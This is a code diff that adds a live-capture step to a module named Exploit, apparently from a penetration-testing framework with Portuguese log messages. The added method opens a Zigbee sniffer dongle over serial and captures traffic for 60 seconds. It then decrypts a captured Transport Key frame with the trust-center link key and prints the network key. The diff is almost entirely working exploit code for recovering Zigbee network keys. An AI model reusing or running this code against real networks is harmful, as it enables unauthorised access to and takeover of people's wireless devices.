@@ -229,3 +229,49 @@ class Exploit(Exploit):
         print_info("  3. zbdump -i {} -c {} -w join.pcap".format(
             self.interface or "CC2531", self.channel))
         print_info(f"  4. zbdecrypt -k {tc_key.hex()} join.pcap")
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: live sniff Zigbee traffic and extract network key."""
+        iface = str(self.interface).strip()
+        if not iface:
+            print_warning("Sem dongle configurado: skip captura ao vivo")
+            return
+
+        tc_key = self._parse_tc_link_key()
+        if not tc_key:
+            return
+
+        import serial
+        try:
+            ser = serial.Serial(iface, 115200, timeout=2)
+        except Exception as exc:
+            print_error(f"Falha ao abrir serial {iface}: {exc}")
+            return
+
+        ch = int(self.channel)
+        ch_cmd = struct.pack("BB", 0x01, ch)
+        ser.write(ch_cmd)
+
+        print_status(f"Sniffing canal {ch} por 60s para capturar Transport Key...")
+        captured = b""
+        deadline = time.time() + 60
+        while time.time() < deadline:
+            chunk = ser.read(512)
+            if chunk:
+                captured += chunk
+
+        ser.close()
+
+        aps_cmd_offset = captured.find(bytes([0x05, 0x01]))
+        if aps_cmd_offset >= 0 and aps_cmd_offset + 20 <= len(captured):
+            encrypted_frame = captured[aps_cmd_offset:aps_cmd_offset + 32]
+            nonce = _build_ccm_nonce(b"\x00" * 8, 0, 0x05)
+            plaintext = _ccm_decrypt(tc_key, nonce, encrypted_frame)
+            if plaintext and len(plaintext) >= 18:
+                nwk_key = plaintext[2:18]
+                print_success(f"NETWORK KEY: {nwk_key.hex()}")
+                return
+
+        print_info(f"Capturados {len(captured)} bytes, nenhum Transport Key frame encontrado")
